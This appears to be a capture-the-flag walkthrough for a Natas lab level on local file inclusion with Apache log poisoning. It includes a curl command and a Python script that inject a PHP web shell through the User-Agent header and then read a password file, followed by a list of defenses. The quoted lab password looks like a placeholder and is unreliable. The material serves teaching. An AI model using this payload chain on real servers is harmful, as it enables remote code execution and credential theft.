25 LFI — Log Poisoning — Remote Code Execution via Log Files Hard
// Key Concepts
Local File Inclusion (LFI) Log Poisoning Remote Code Execution Apache Access Logs User-Agent Manipulation
// Challenge Overview

This level demonstrates a Local File Inclusion (LFI) vulnerability combined with log poisoning. The application includes a file based on user input, and the web server logs user agents. By poisoning the access log with PHP code and then including that log file, we can achieve Remote Code Execution (RCE).

// Initial Analysis

Check the source code to understand the vulnerability:

<?php $file = $_GET["file"]; $file = str_replace("../", "", $file); include($file); ?>

The code attempts to prevent directory traversal by removing ../, but it still allows file inclusion. We can include the Apache access log file which contains User-Agent strings.

💡 Log poisoning is a technique where an attacker injects malicious code into a log file (like Apache access logs) and then includes that log file using an LFI vulnerability to execute the code.
// Understanding Log Poisoning

Apache logs every request in the access log. The log entry includes:

  • IP address
  • Timestamp
  • HTTP method and URL
  • HTTP status code
  • User-Agent header

By setting the User-Agent header to PHP code, we can write code into the log file. Then, using the LFI vulnerability, we include the log file and execute the code.

// Solution Steps

Step 1 — Find the log file location:

Apache logs are typically stored in:

  • /var/log/apache2/access.log
  • /var/log/httpd/access_log
  • /var/log/apache/access.log

We can try to access the log file using the LFI vulnerability:

http://natas25.natas.labs.overthewire.org/?file=/var/log/apache2/access.log

Step 2 — Poison the log with PHP code:

Set the User-Agent header to PHP code:

curl -u natas25:c0y5f8Mq3W9qN5qP8qV5qV8qV5qV8q \ -A "<?php system($_GET['cmd']); ?>" \ http://natas25.natas.labs.overthewire.org/

Step 3 — Include the log file:

http://natas25.natas.labs.overthewire.org/?file=/var/log/apache2/access.log&cmd=cat /etc/natas_webpass/natas26

Using Python:

import requests url = "http://natas25.natas.labs.overthewire.org/" auth = ("natas25", "c0y5f8Mq3W9qN5qP8qV5qV8qV5qV8q") # Poison the log headers = {"User-Agent": "<?php system($_GET['cmd']); ?>"} response = requests.get(url, auth=auth, headers=headers) # Include the log file and execute commands log_file = "/var/log/apache2/access.log" params = {"file": log_file, "cmd": "cat /etc/natas_webpass/natas26"} response = requests.get(url, auth=auth, params=params) print(response.text)
// Why It Works

The vulnerability exists because:

  • LFI vulnerability: The application includes arbitrary files.
  • Log file is writable: The web server writes to the log file.
  • User-Agent is logged: The User-Agent header is written to the log.
  • PHP code in logs: The User-Agent can contain PHP code.
// Common Log File Locations
# Apache (Debian/Ubuntu) /var/log/apache2/access.log /var/log/apache2/error.log # Apache (RHEL/CentOS) /var/log/httpd/access_log /var/log/httpd/error_log # Nginx /var/log/nginx/access.log /var/log/nginx/error.log # Other /proc/self/fd/2 /var/log/syslog
// Defense Measures
  • Avoid file inclusion: Never include files based on user input.
  • Use whitelist: Only allow inclusion of pre-approved files.
  • Sanitize User-Agent: Strip dangerous characters from User-Agent.
  • Store logs securely: Keep log files outside the web root.
  • Disable PHP in log directories: Prevent PHP execution in log directories.

// Key Takeaways
📄 LFI Is Dangerous

Local File Inclusion can lead to Remote Code Execution when combined with log poisoning or other techniques.

🛡️ Validate All Input

Always validate and sanitize user input, including HTTP headers like User-Agent.
